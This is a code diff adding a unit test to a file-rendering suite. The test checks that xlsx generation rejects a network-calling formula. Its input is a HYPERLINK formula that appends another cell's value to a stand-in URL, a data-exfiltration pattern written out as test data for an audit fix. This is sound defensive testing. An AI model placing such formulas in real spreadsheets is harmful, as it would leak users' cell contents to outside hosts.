@@ -55,6 +55,11 @@ describe("renderFile", () => {
 		expect(ws.getRow(1).font?.bold).toBe(true);
 	});
 
+	it("xlsx recusa fórmula de rede ou execução (auditoria F2, S4)", async () => {
+		const input = parseCreateFileArgs({ filename: "x.xlsx", sheets: [{ rows: [["a", '=HYPERLINK("http://x/"&A1,"a")']] }] });
+		await expect(renderFile(input)).rejects.toThrow(/HYPERLINK/);
+	});
+
 	it("pptx gera um zip válido", async () => {
 		const out = await renderFile(
 			parseCreateFileArgs({ filename: "deck.pptx", slides: [{ title: "Oi", bullets: ["a", "b"] }] }),
